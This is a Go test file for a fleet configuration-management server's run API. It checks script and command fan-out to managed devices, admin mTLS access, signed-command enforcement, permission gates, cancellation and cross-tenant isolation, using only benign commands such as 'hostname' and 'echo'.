// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Jordan Ritz
package api

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/gorilla/mux"

	configsignature "github.com/cfgis/cfgms/features/config/signature"
	"github.com/cfgis/cfgms/features/controller/config"
	"github.com/cfgis/cfgms/features/controller/fleet"
	controllerrun "github.com/cfgis/cfgms/features/controller/run"
	scriptmodule "github.com/cfgis/cfgms/features/modules/stdlib/script"
	"github.com/cfgis/cfgms/pkg/cert"
	"github.com/cfgis/cfgms/pkg/ctxkeys"
	"github.com/cfgis/cfgms/pkg/session"
	_ "modernc.org/sqlite"
)

// withPrincipal injects a principal + its tenant into the request context exactly
// as authenticationMiddleware does for an mTLS admin cert (Issue #1990).
func withPrincipal(req *http.Request, p *Principal) *http.Request {
	ctx := context.WithValue(req.Context(), principalContextKey, p)
	ctx = context.WithValue(ctx, ctxkeys.TenantID, p.TenantID)
	return req.WithContext(ctx)
}

// postRunWithPrincipal calls a run handler directly with the given principal +
// its tenant injected into the request context, exactly as authenticationMiddleware
// would for an mTLS admin cert. An X-API-Key request always carries a tenant, so it
// cannot reproduce the admin-mTLS global-scope (empty-tenant) path — Issue #1990.
func postRunWithPrincipal(t *testing.T, handler http.HandlerFunc, path string, p *Principal, body interface{}) *httptest.ResponseRecorder {
	t.Helper()
	b, err := json.Marshal(body)
	require.NoError(t, err)
	req := httptest.NewRequest(http.MethodPost, path, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	ctx := context.WithValue(req.Context(), principalContextKey, p)
	ctx = context.WithValue(ctx, ctxkeys.TenantID, p.TenantID)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	handler(rec, req)
	return rec
}

// ---- test helpers -----------------------------------------------------------

// staticRunFleetQuery is a real FleetQuery implementation that returns a fixed
// set of stewards. It is NOT a mock — it satisfies the fleet.FleetQuery interface.
type staticRunFleetQuery struct {
	results []fleet.StewardResult
}

func (q *staticRunFleetQuery) Search(_ context.Context, _ fleet.Filter) ([]fleet.StewardResult, error) {
	return q.results, nil
}

func (q *staticRunFleetQuery) Count(_ context.Context, _ fleet.Filter) (int, error) {
	return len(q.results), nil
}

// newTestRunManager creates a run.Manager backed by an in-memory SQLite database.
func newTestRunManager(t *testing.T) *controllerrun.Manager {
	t.Helper()

	db, err := sql.Open("sqlite", ":memory:")
	require.NoError(t, err)
	t.Cleanup(func() { _ = db.Close() })

	store := controllerrun.NewRunStoreSQL(db)
	require.NoError(t, store.Init(context.Background()))

	return controllerrun.NewManager(store, nil)
}

// newTestRunQueue creates a real ExecutionQueue backed by an in-memory store.
// Registers cleanup via t so the queue's EphemeralKeyManager goroutine is stopped.
func newTestRunQueue(t *testing.T) *scriptmodule.ExecutionQueue {
	t.Helper()
	monitor := scriptmodule.NewExecutionMonitor()
	keyManager := scriptmodule.NewEphemeralKeyManager()
	queue := scriptmodule.NewExecutionQueue(monitor, keyManager, 0, "", nil, nil, 0)
	t.Cleanup(queue.Stop)
	return queue
}

// setupRunServer creates a test server wired with a run manager, execution queue,
// and a fleet query returning the given stewards.
func setupRunServer(t *testing.T, stewards []fleet.StewardResult) (*Server, *controllerrun.Manager, *scriptmodule.ExecutionQueue) {
	t.Helper()
	server := setupTestServer(t)

	manager := newTestRunManager(t)
	queue := newTestRunQueue(t)

	server.SetRunManager(manager, queue)
	// Issue #3495: run synthesis uses clusterFleetQuery; enforceExecTenantScope uses
	// fleetQuery (out-of-scope per issue spec). Both are overridden here so the static
	// steward fixtures reach both code paths.
	static := &staticRunFleetQuery{results: stewards}
	server.clusterFleetQuery = static
	server.fleetQuery = static

	return server, manager, queue
}

// postRunScript sends POST /api/v1/runs/script with the given request body.
func postRunScript(t *testing.T, server *Server, apiKey string, body interface{}) *httptest.ResponseRecorder {
	t.Helper()
	b, err := json.Marshal(body)
	require.NoError(t, err)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/script", bytes.NewReader(b))
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	server.router.ServeHTTP(rec, req)
	return rec
}

// postRunCommand sends POST /api/v1/runs/command with the given request body.
func postRunCommand(t *testing.T, server *Server, apiKey string, body interface{}) *httptest.ResponseRecorder {
	t.Helper()
	b, err := json.Marshal(body)
	require.NoError(t, err)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/command", bytes.NewReader(b))
	req.Header.Set("X-API-Key", apiKey)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	server.router.ServeHTTP(rec, req)
	return rec
}

// getRun sends GET /api/v1/runs/{runID}.
func getRun(t *testing.T, server *Server, apiKey, runID string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID, nil)
	req.Header.Set("X-API-Key", apiKey)
	rec := httptest.NewRecorder()
	server.router.ServeHTTP(rec, req)
	return rec
}

// getRunJobs sends GET /api/v1/runs/{runID}/jobs.
func getRunJobs(t *testing.T, server *Server, apiKey, runID string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID+"/jobs", nil)
	req.Header.Set("X-API-Key", apiKey)
	rec := httptest.NewRecorder()
	server.router.ServeHTTP(rec, req)
	return rec
}

// deleteRun sends DELETE /api/v1/runs/{runID}.
func deleteRun(t *testing.T, server *Server, apiKey, runID string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodDelete, "/api/v1/runs/"+runID, nil)
	req.Header.Set("X-API-Key", apiKey)
	rec := httptest.NewRecorder()
	server.router.ServeHTTP(rec, req)
	return rec
}

// ---- [REQUIRED TEST] POST /api/v1/runs/script fan-out ----------------------

// TestPostRunScript_TwoStewardFanout verifies that POST /api/v1/runs/script with
// two matching stewards creates exactly two JobRecords and two QueuedExecutions,
// each carrying workflow_run_id in metadata. This is the primary AC test.
func TestPostRunScript_TwoStewardFanout(t *testing.T) {
	stewards := []fleet.StewardResult{
		{ID: "steward-001", TenantID: "test-tenant"},
		{ID: "steward-002", TenantID: "test-tenant"},
	}
	server, manager, queue := setupRunServer(t, stewards)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	rec := postRunScript(t, server, apiKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/deploy.sh",
		"params":    map[string]string{"env": "prod"},
	})
	require.Equal(t, http.StatusOK, rec.Code, "expected 200 OK, body: %s", rec.Body.String())

	var resp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	data, ok := resp.Data.(map[string]interface{})
	require.True(t, ok, "response data must be an object")
	runID, ok := data["run_id"].(string)
	require.True(t, ok && runID != "", "response must contain a non-empty run_id")

	// Two JobRecords must exist, one per steward
	jobs, err := manager.ListRunJobs(context.Background(), runID)
	require.NoError(t, err)
	require.Len(t, jobs, 2, "must have two job records — one per matched steward")

	deviceIDs := map[string]bool{}
	for _, j := range jobs {
		assert.Equal(t, runID, j.RunID)
		assert.NotEmpty(t, j.ExecutionID, "each job must have a pre-assigned execution_id")
		deviceIDs[j.DeviceID] = true
	}
	assert.True(t, deviceIDs["steward-001"], "job for steward-001 must exist")
	assert.True(t, deviceIDs["steward-002"], "job for steward-002 must exist")

	// Two QueuedExecutions must exist, each with workflow_run_id in metadata
	exec1 := queue.PeekForDevice("steward-001")
	exec2 := queue.PeekForDevice("steward-002")
	require.Len(t, exec1, 1, "steward-001 must have one queued execution")
	require.Len(t, exec2, 1, "steward-002 must have one queued execution")

	for _, e := range []*scriptmodule.QueuedExecution{exec1[0], exec2[0]} {
		assert.Equal(t, runID, e.Metadata["workflow_run_id"],
			"queued execution must carry workflow_run_id")
		assert.NotEmpty(t, e.Metadata["job_id"], "queued execution must carry job_id")
	}
}

// ---- [REQUIRED TEST] admin mTLS (empty-tenant) run dispatch (Issue #1990) ---

// TestRunCommand_AdminMTLSEmptyTenant_NotUnauthorized proves the Issue #1990 fix:
// an admin mTLS principal (global scope, TenantID="") can dispatch cfg steward exec.
// Before the fix the early tenantID=="" gate returned 401 before the admin-aware
// logic ran.
func TestRunCommand_AdminMTLSEmptyTenant_NotUnauthorized(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
	server, _, _ := setupRunServer(t, stewards)

	body := map[string]interface{}{
		"target":  "id:steward-1",
		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
		"shell":   "pwsh",
	}
	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command",
		&Principal{ID: "cfgms-admin", Assurance: session.AssuranceBasic, GlobalScope: true, TenantID: ""}, body)

	require.NotEqual(t, http.StatusUnauthorized, rec.Code,
		"admin mTLS principal (empty tenant) must not be rejected as unauthenticated; body: %s", rec.Body.String())
	assert.Equal(t, http.StatusOK, rec.Code, "admin exec should reach run synthesis; body: %s", rec.Body.String())
}

func TestPublicBetaRunCommandRequiresAndPreservesOperatorSignature(t *testing.T) {
	const content = "hostname"
	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
	server, _, queue := setupRunServer(t, stewards)
	server.cfg.SecurityProfile = config.SecurityProfilePublicBeta
	server.cfg.Execution.RequireSignedAdhoc = true
	server.certManager = newTLSTestCertManager(t)
	admin := &Principal{ID: "cfgms-admin", Assurance: session.AssuranceBasic, GlobalScope: true}

	unsigned := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command", admin, map[string]interface{}{
		"target":  "id:steward-1",
		"content": base64.StdEncoding.EncodeToString([]byte(content)),
		"shell":   "pwsh",
	})
	require.Equal(t, http.StatusBadRequest, unsigned.Code, "body: %s", unsigned.Body.String())
	assert.Contains(t, unsigned.Body.String(), "INVALID_SIGNATURE")
	assert.Empty(t, queue.PeekForDevice("steward-1"), "unsigned command must not reach the execution queue")

	operator, err := server.certManager.GenerateClientCertificate(&cert.ClientCertConfig{
		CommonName:       "public-beta-operator",
		ValidityDays:     1,
		KeySize:          2048,
		ClientID:         "public-beta-operator",
		TemplateModifier: cert.SetAdminMarker,
	})
	require.NoError(t, err)
	signer, err := configsignature.NewSigner(&configsignature.SignerConfig{
		PrivateKeyPEM:  operator.PrivateKeyPEM,
		CertificatePEM: operator.CertificatePEM,
	})
	require.NoError(t, err)
	signedContent, err := signer.Sign([]byte(content))
	require.NoError(t, err)

	signed := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command", admin, map[string]interface{}{
		"target":  "id:steward-1",
		"content": base64.StdEncoding.EncodeToString([]byte(content)),
		"shell":   "pwsh",
		"signature": map[string]interface{}{
			"algorithm":  string(signedContent.Algorithm),
			"value":      signedContent.Signature,
			"public_key": string(operator.CertificatePEM),
		},
	})
	require.Equal(t, http.StatusOK, signed.Code, "body: %s", signed.Body.String())

	queued := queue.PeekForDevice("steward-1")
	require.Len(t, queued, 1)
	assert.Equal(t, string(signedContent.Algorithm), queued[0].Metadata["signature_algorithm"])
	assert.Equal(t, signedContent.Signature, queued[0].Metadata["signature_value"])
	assert.Equal(t, string(operator.CertificatePEM), queued[0].Metadata["signature_public_key"])
}

// TestRunScript_AdminMTLSEmptyTenant_NotUnauthorized is the same guard for run-script.
func TestRunScript_AdminMTLSEmptyTenant_NotUnauthorized(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
	server, _, _ := setupRunServer(t, stewards)

	body := map[string]interface{}{"target": "all", "script_id": "scripts/check.sh"}
	rec := postRunWithPrincipal(t, server.handlePostRunScript, "/api/v1/runs/script",
		&Principal{ID: "cfgms-admin", Assurance: session.AssuranceBasic, GlobalScope: true, TenantID: ""}, body)

	require.NotEqual(t, http.StatusUnauthorized, rec.Code,
		"admin mTLS principal (empty tenant) must not be rejected; body: %s", rec.Body.String())
	assert.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
}

// TestRunCommand_NonAdminEmptyTenant_StillUnauthorized guards against regression:
// a non-admin principal with no tenant must remain unauthorized.
func TestRunCommand_NonAdminEmptyTenant_StillUnauthorized(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)

	body := map[string]interface{}{
		"target":  "all",
		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
		"shell":   "pwsh",
	}
	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command",
		&Principal{ID: "scoped-key", Assurance: session.AssuranceMachine, TenantID: ""}, body)

	assert.Equal(t, http.StatusUnauthorized, rec.Code,
		"a non-admin principal with no tenant must remain unauthorized")
}

// TestRunLifecycle_AdminMTLSEmptyTenant covers the FULL cfg steward exec lifecycle
// for an admin mTLS principal (Issue #1990): dispatch, then read the run + jobs and
// cancel it. The exec CLI dispatches and then polls GET /runs/{id} for output, so
// fixing only the POST gate would leave exec broken — the GET/DELETE handlers must
// also admit admin principals. Before the full fix those handlers 401'd admins.
func TestRunLifecycle_AdminMTLSEmptyTenant(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
	server, _, _ := setupRunServer(t, stewards)
	admin := &Principal{ID: "cfgms-admin", Assurance: session.AssuranceBasic, GlobalScope: true, TenantID: ""}

	// 1. Dispatch (POST) as admin.
	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command", admin, map[string]interface{}{
		"target":  "id:steward-1",
		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
		"shell":   "pwsh",
	})
	require.Equal(t, http.StatusOK, rec.Code, "dispatch body: %s", rec.Body.String())
	var resp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	runID, _ := resp.Data.(map[string]interface{})["run_id"].(string)
	require.NotEmpty(t, runID, "dispatch must return a run_id")

	// 2. GET the run as admin (the exec CLI polls this) — must not 401, must find it.
	getReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID, nil), map[string]string{"run_id": runID}), admin)
	getRec := httptest.NewRecorder()
	server.handleGetRun(getRec, getReq)
	require.Equal(t, http.StatusOK, getRec.Code, "admin GET run must succeed (not 401/404); body: %s", getRec.Body.String())

	// 3. GET the run's jobs as admin — must not 401.
	jobsReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID+"/jobs", nil), map[string]string{"run_id": runID}), admin)
	jobsRec := httptest.NewRecorder()
	server.handleGetRunJobs(jobsRec, jobsReq)
	require.Equal(t, http.StatusOK, jobsRec.Code, "admin GET jobs must succeed; body: %s", jobsRec.Body.String())

	// 4. DELETE/cancel the run as admin — must not 401 (200 cancel or 409 if already terminal).
	delReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodDelete, "/api/v1/runs/"+runID, nil), map[string]string{"run_id": runID}), admin)
	delRec := httptest.NewRecorder()
	server.handleDeleteRun(delRec, delReq)
	require.Contains(t, []int{http.StatusOK, http.StatusConflict}, delRec.Code,
		"admin DELETE must succeed (200) or be already-terminal (409) — never 401/404/5xx; body: %s", delRec.Body.String())
}

// TestGetRun_NonAdminCrossTenant_NotFound guards isolation: a tenant-scoped caller
// cannot read another tenant's run (admin-aware ownership check must not weaken this).
func TestGetRun_NonAdminCrossTenant_NotFound(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "tenant-a"}}
	server, _, _ := setupRunServer(t, stewards)

	// Admin dispatches a run owned by the global/empty tenant.
	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command",
		&Principal{ID: "cfgms-admin", Assurance: session.AssuranceBasic, GlobalScope: true, TenantID: ""}, map[string]interface{}{
			"target":  "id:steward-1",
			"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
			"shell":   "pwsh",
		})
	require.Equal(t, http.StatusOK, rec.Code)
	var resp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	runID := resp.Data.(map[string]interface{})["run_id"].(string)

	// A tenant-scoped (non-admin) caller from a different tenant must get 404.
	scoped := &Principal{ID: "tenant-b-key", Assurance: session.AssuranceMachine, TenantID: "tenant-b"}
	getReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID, nil), map[string]string{"run_id": runID}), scoped)
	getRec := httptest.NewRecorder()
	server.handleGetRun(getRec, getReq)
	assert.Equal(t, http.StatusNotFound, getRec.Code, "a scoped caller must not see another tenant's run")
}

// ---- [REQUIRED TEST] GET /api/v1/runs/{run_id}/jobs accuracy ---------------

// TestGetRunJobs_ReturnsCorrectDeviceAndExecutionIDs verifies that
// GET /api/v1/runs/{run_id}/jobs returns each job with the correct device_id and
// execution_id matching what was stored by the synthesis path.
func TestGetRunJobs_ReturnsCorrectDeviceAndExecutionIDs(t *testing.T) {
	stewards := []fleet.StewardResult{
		{ID: "device-A", TenantID: "test-tenant"},
		{ID: "device-B", TenantID: "test-tenant"},
	}
	server, _, queue := setupRunServer(t, stewards)
	execKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
	readKey := NewTestKey(t, server, []string{"steward:read-scripts"})

	// Create the run
	rec := postRunScript(t, server, execKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/check.sh",
	})
	require.Equal(t, http.StatusOK, rec.Code)

	var createResp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &createResp))
	runID := createResp.Data.(map[string]interface{})["run_id"].(string)

	// Query the jobs
	jobsRec := getRunJobs(t, server, readKey, runID)
	require.Equal(t, http.StatusOK, jobsRec.Code, "body: %s", jobsRec.Body.String())

	var jobsResp APIResponse
	require.NoError(t, json.Unmarshal(jobsRec.Body.Bytes(), &jobsResp))
	items, ok := jobsResp.Data.([]interface{})
	require.True(t, ok, "response data must be an array")
	require.Len(t, items, 2, "must return one job per matched steward")

	// Cross-check each job's device_id and execution_id against the queue
	jobsByDevice := map[string]map[string]interface{}{}
	for _, item := range items {
		m := item.(map[string]interface{})
		deviceID, _ := m["device_id"].(string)
		jobsByDevice[deviceID] = m
	}

	for _, deviceID := range []string{"device-A", "device-B"} {
		j, found := jobsByDevice[deviceID]
		require.True(t, found, "job for %s must exist", deviceID)

		executionID, _ := j["execution_id"].(string)
		assert.NotEmpty(t, executionID, "execution_id must not be empty for %s", deviceID)

		// The execution_id in the job record must match the one in the queue
		queued := queue.PeekForDevice(deviceID)
		require.Len(t, queued, 1, "%s must have one queued execution", deviceID)
		assert.Equal(t, executionID, queued[0].ExecutionID,
			"job execution_id must match queued execution for %s", deviceID)
	}
}

// ---- [REQUIRED TEST] Permission gates ---------------------------------------

// TestRunEndpoints_PermissionGates verifies that POST/DELETE require
// steward:execute-scripts and GET requires steward:read-scripts.
func TestRunEndpoints_PermissionGates(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "device-perm", TenantID: "test-tenant"}}
	server, _, _ := setupRunServer(t, stewards)

	readOnlyKey := NewTestKey(t, server, []string{"steward:read-scripts"})
	execOnlyKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	// POST /runs/script requires execute-scripts
	rec := postRunScript(t, server, readOnlyKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/test.sh",
	})
	assert.Equal(t, http.StatusForbidden, rec.Code, "POST /runs/script must require execute-scripts")

	// POST /runs/command requires execute-scripts
	rec = postRunCommand(t, server, readOnlyKey, map[string]interface{}{
		"target":  "all",
		"content": base64.StdEncoding.EncodeToString([]byte("echo hi")),
		"shell":   "bash",
	})
	assert.Equal(t, http.StatusForbidden, rec.Code, "POST /runs/command must require execute-scripts")

	// GET /runs/{run_id} requires read-scripts
	// Create a run first with exec key
	createRec := postRunScript(t, server, execOnlyKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/test.sh",
	})
	require.Equal(t, http.StatusOK, createRec.Code)
	var createResp APIResponse
	require.NoError(t, json.Unmarshal(createRec.Body.Bytes(), &createResp))
	runID := createResp.Data.(map[string]interface{})["run_id"].(string)

	rec = getRun(t, server, execOnlyKey, runID)
	assert.Equal(t, http.StatusForbidden, rec.Code, "GET /runs/{id} must require read-scripts")

	rec = getRunJobs(t, server, execOnlyKey, runID)
	assert.Equal(t, http.StatusForbidden, rec.Code, "GET /runs/{id}/jobs must require read-scripts")

	// DELETE requires execute-scripts
	rec = deleteRun(t, server, readOnlyKey, runID)
	assert.Equal(t, http.StatusForbidden, rec.Code, "DELETE /runs/{id} must require execute-scripts")
}

// ---- DELETE /api/v1/runs/{run_id} ------------------------------------------

// TestDeleteRun_Success verifies that DELETE on a non-terminal run returns 200
// and the run is cancelled.
func TestDeleteRun_Success(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "device-del", TenantID: "test-tenant"}}
	server, _, _ := setupRunServer(t, stewards)
	execKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
	readKey := NewTestKey(t, server, []string{"steward:read-scripts"})

	// Create a run
	createRec := postRunScript(t, server, execKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/cleanup.sh",
	})
	require.Equal(t, http.StatusOK, createRec.Code)
	var createResp APIResponse
	require.NoError(t, json.Unmarshal(createRec.Body.Bytes(), &createResp))
	runID := createResp.Data.(map[string]interface{})["run_id"].(string)

	// Cancel it
	delRec := deleteRun(t, server, execKey, runID)
	require.Equal(t, http.StatusOK, delRec.Code, "DELETE must return 200 for a non-terminal run; body: %s", delRec.Body.String())

	var delResp APIResponse
	require.NoError(t, json.Unmarshal(delRec.Body.Bytes(), &delResp))
	data, ok := delResp.Data.(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, true, data["cancelled"], "response must include cancelled: true")

	// Verify the run is durably cancelled via the read endpoint.
	getResp := getRun(t, server, readKey, runID)
	require.Equal(t, http.StatusOK, getResp.Code)
	var runResp APIResponse
	require.NoError(t, json.Unmarshal(getResp.Body.Bytes(), &runResp))
	runData, ok := runResp.Data.(map[string]interface{})
	require.True(t, ok, "GET response data must be an object")
	assert.Equal(t, "cancelled", runData["status"], "run status must be 'cancelled' after DELETE")
}

// TestDeleteRun_NotFound verifies that DELETE on an unknown run returns 404.
func TestDeleteRun_NotFound(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	rec := deleteRun(t, server, apiKey, "no-such-run-id")
	assert.Equal(t, http.StatusNotFound, rec.Code, "DELETE on unknown run must return 404")

	var resp ErrorResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	require.NotNil(t, resp.Error)
	assert.Equal(t, "NOT_FOUND", resp.Error.Code)
}

// TestDeleteRun_AlreadyTerminal verifies that DELETE on a completed run returns 409.
func TestDeleteRun_AlreadyTerminal(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "device-term", TenantID: "test-tenant"}}
	server, _, _ := setupRunServer(t, stewards)
	execKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	// Create and cancel a run (so it's in a terminal state)
	createRec := postRunScript(t, server, execKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/test.sh",
	})
	require.Equal(t, http.StatusOK, createRec.Code)
	var createResp APIResponse
	require.NoError(t, json.Unmarshal(createRec.Body.Bytes(), &createResp))
	runID := createResp.Data.(map[string]interface{})["run_id"].(string)

	// Cancel it once
	require.Equal(t, http.StatusOK, deleteRun(t, server, execKey, runID).Code)

	// Cancel it again — must return 409
	rec := deleteRun(t, server, execKey, runID)
	assert.Equal(t, http.StatusConflict, rec.Code, "DELETE on terminal run must return 409")

	var resp ErrorResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	require.NotNil(t, resp.Error)
	assert.Equal(t, "ALREADY_TERMINAL", resp.Error.Code)
}

// ---- GET /api/v1/runs/{run_id} ----------------------------------------------

func TestGetRun_Found(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "device-get", TenantID: "test-tenant"}}
	server, _, _ := setupRunServer(t, stewards)
	execKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
	readKey := NewTestKey(t, server, []string{"steward:read-scripts"})

	createRec := postRunScript(t, server, execKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/get-test.sh",
	})
	require.Equal(t, http.StatusOK, createRec.Code)
	var createResp APIResponse
	require.NoError(t, json.Unmarshal(createRec.Body.Bytes(), &createResp))
	runID := createResp.Data.(map[string]interface{})["run_id"].(string)

	rec := getRun(t, server, readKey, runID)
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	data, ok := resp.Data.(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, runID, data["run_id"])
}

func TestGetRun_NotFound(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	apiKey := NewTestKey(t, server, []string{"steward:read-scripts"})

	rec := getRun(t, server, apiKey, "nonexistent-run")
	assert.Equal(t, http.StatusNotFound, rec.Code)
}

// ---- POST /api/v1/runs/command ----------------------------------------------

func TestPostRunScript_MissingScriptID_ReturnsBadRequest(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	rec := postRunScript(t, server, apiKey, map[string]interface{}{
		"target": "all",
		// script_id intentionally omitted
	})
	assert.Equal(t, http.StatusBadRequest, rec.Code, "POST /runs/script without script_id must return 400")

	var resp ErrorResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	require.NotNil(t, resp.Error)
	assert.Equal(t, "MISSING_SCRIPT_ID", resp.Error.Code)
}

func TestPostRunCommand_TwoStewardFanout(t *testing.T) {
	stewards := []fleet.StewardResult{
		{ID: "cmd-dev-1", TenantID: "test-tenant"},
		{ID: "cmd-dev-2", TenantID: "test-tenant"},
	}
	server, manager, queue := setupRunServer(t, stewards)
	execKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	content := base64.StdEncoding.EncodeToString([]byte("#!/bin/bash\necho hello"))
	rec := postRunCommand(t, server, execKey, map[string]interface{}{
		"target":  "all",
		"content": content,
		"shell":   "bash",
	})
	require.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())

	var resp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	runID := resp.Data.(map[string]interface{})["run_id"].(string)
	assert.NotEmpty(t, runID)

	jobs, err := manager.ListRunJobs(context.Background(), runID)
	require.NoError(t, err)
	require.Len(t, jobs, 2)

	// Inline content must be in queue metadata
	for _, deviceID := range []string{"cmd-dev-1", "cmd-dev-2"} {
		queued := queue.PeekForDevice(deviceID)
		require.Len(t, queued, 1, "%s must have one queued execution", deviceID)
		assert.Equal(t, "#!/bin/bash\necho hello",
			queued[0].Metadata["inline_script_content"],
			"inline content must be in metadata for %s", deviceID)
	}
}

func TestPostRunCommand_InvalidBase64_ReturnsBadRequest(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	rec := postRunCommand(t, server, apiKey, map[string]interface{}{
		"target":  "all",
		"content": "not-valid-base64!!!",
		"shell":   "bash",
	})
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

func TestPostRunCommand_MissingContent_ReturnsBadRequest(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	rec := postRunCommand(t, server, apiKey, map[string]interface{}{
		"target": "all",
		"shell":  "bash",
	})
	assert.Equal(t, http.StatusBadRequest, rec.Code)
}

// ---- Tenant isolation (IDOR prevention) -------------------------------------

// TestRunEndpoints_TenantIsolation verifies that a principal in one tenant cannot
// read or cancel runs belonging to another tenant. GET and DELETE must return 404
// (not 403) to avoid leaking cross-tenant run existence.
func TestRunEndpoints_TenantIsolation(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "device-iso", TenantID: "test-tenant"}}
	server, _, _ := setupRunServer(t, stewards)

	// Create a run as the default test-tenant (tenantID = "test-tenant")
	execKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
	createRec := postRunScript(t, server, execKey, map[string]interface{}{
		"target":    "all",
		"script_id": "scripts/iso-test.sh",
	})
	require.Equal(t, http.StatusOK, createRec.Code)
	var createResp APIResponse
	require.NoError(t, json.Unmarshal(createRec.Body.Bytes(), &createResp))
	runID := createResp.Data.(map[string]interface{})["run_id"].(string)

	// A second tenant's API key (different tenantID) must not be able to read the run.
	// NewEphemeralTestKey allows specifying a tenantID.
	otherReadKey := NewEphemeralTestKey(t, server, []string{"steward:read-scripts"}, "other-tenant", 5*60*1000000000)
	rec := getRun(t, server, otherReadKey, runID)
	assert.Equal(t, http.StatusNotFound, rec.Code, "cross-tenant GET must return 404")

	// Cross-tenant jobs listing must also return 404.
	rec = getRunJobs(t, server, otherReadKey, runID)
	assert.Equal(t, http.StatusNotFound, rec.Code, "cross-tenant GET jobs must return 404")

	// Cross-tenant DELETE must return 404.
	otherExecKey := NewEphemeralTestKey(t, server, []string{"steward:execute-scripts"}, "other-tenant", 5*60*1000000000)
	rec = deleteRun(t, server, otherExecKey, runID)
	assert.Equal(t, http.StatusNotFound, rec.Code, "cross-tenant DELETE must return 404")
}

// TestRunVisibleTo_AssuranceBoundary is a table-driven regression test for the
// runVisibleTo helper (handlers_runs.go) confirming that the Assurance-based
// isolation gate is byte-for-byte equivalent to the deleted IsAdmin check:
//   - AssuranceBasic (admin) principal always sees the run regardless of tenant.
